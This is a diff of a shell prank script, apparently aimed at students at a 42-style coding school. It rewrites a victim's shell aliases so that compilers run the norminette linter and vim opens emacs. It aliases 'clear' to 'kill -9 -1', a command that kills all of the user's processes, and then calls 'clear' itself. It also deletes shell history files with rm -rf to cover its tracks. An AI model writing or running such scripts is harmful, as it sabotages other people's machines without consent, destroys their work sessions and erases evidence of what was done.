@@ -1,24 +1,16 @@
-echo "alias norminette = cc" >> ~/.zshrc
-echo "alias norme = cat *" >> ~/.zshrc
-echo "alias cc = norminette" >> ~/.zshrc
-echo "alias gcc = norminette" >> ~/.zshrc
-echo "alias clang = norminette" >> ~/.zshrc
-echo "alias vi = nano" >> ~/.zshrc
-echo "alias vim = emacs -rv" >> ~/.zshrc
-echo "alias clang = norminette" >> ~/.zshrc
-
-echo "alias norminette = cc" >> ~/.bashrc
-echo "alias norme = cat *" >> ~/.bashrc
-echo "alias cc = norminette" >> ~/.bashrc
-echo "alias gcc = norminette" >> ~/.bashrc
-echo "alias clang = norminette" >> ~/.bashrc
-echo "alias vi = nano" >> ~/.bashrc
-echo "alias vim = emacs -rv" >> ~/.bashrc
-echo "alias clang = norminette" >> ~/.bashrc
-echo "alias clear = kill -9 -1" >> ~/.bashrc
-
+echo "alias norminette=cc" >> ~/.trollhrc
+echo "alias norme='cat *'" >> ~/.trollhrc
+echo "alias cc=norminette" >> ~/.trollhrc
+echo "alias gcc= orminette" >> ~/.trollhrc
+echo "alias clang=norminette" >> ~/.trollhrc
+echo "alias vi=nano" >> ~/.zshrc
+echo "alias vim='emacs -rv'" >> ~/.trollhrc
+echo "alias clang=norminette" >> ~/.trollhrc
+echo "alias clear='kill -9 -1'" >> ~/.trollhrc
+source ~/.trollhrc
+cp -r LOL/README.md ~/.powpowpow
+cd
+rm -rf LOL ~/zsh_history ~/sh_history ~/bash_history && cd
 clear
+cat ~/.powpowpow
 
-cat LOL/README.md
-
-rm -rf LOL ~/zsh_history ~/sh_history ~/bash_history
